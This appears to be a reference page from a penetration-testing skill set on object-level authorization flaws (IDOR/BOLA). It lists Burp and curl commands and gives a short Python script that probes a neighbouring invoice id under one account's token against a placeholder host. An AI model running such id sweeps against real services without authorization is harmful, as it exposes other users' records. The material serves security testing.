# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`authorization-and-idor-object-level`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `Burp Intruder` | `Set a Numbers payload on the id path position with a low-privilege session` | Sweep sequential ids for cross-owner reads under one credential | Cross-platform |
| `curl` | `curl -si https://target.example/api/invoices/5002 -H 'Authorization: Bearer A'` | Confirm a neighbour invoice resolves under the caller's token | Cross-platform |
| `Burp Autorize` | `Replay browsed requests with account-A as the context against account-B objects` | Auto-flag object references that resolve across owners | Cross-platform |

## Minimal Script Shape

A neighbour-id differential: it reads the caller's own invoice and an adjacent id under one token, then reports BOLA when the neighbour resolves.

```python
import urllib.error
import urllib.request

BASE = "https://target.example/api/invoices/"

def read(resource_id, token):
    req = urllib.request.Request(BASE + resource_id,
                                 headers={"Authorization": "Bearer " + token})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status
    except urllib.error.HTTPError as exc:
        return exc.code

token_a = "<account-a-token>"
own = read("5001", token_a)
neighbour = read("5002", token_a)
print({"own_id": own, "neighbour_id": neighbour,
       "bola_confirmed": own == 200 and neighbour == 200})
```
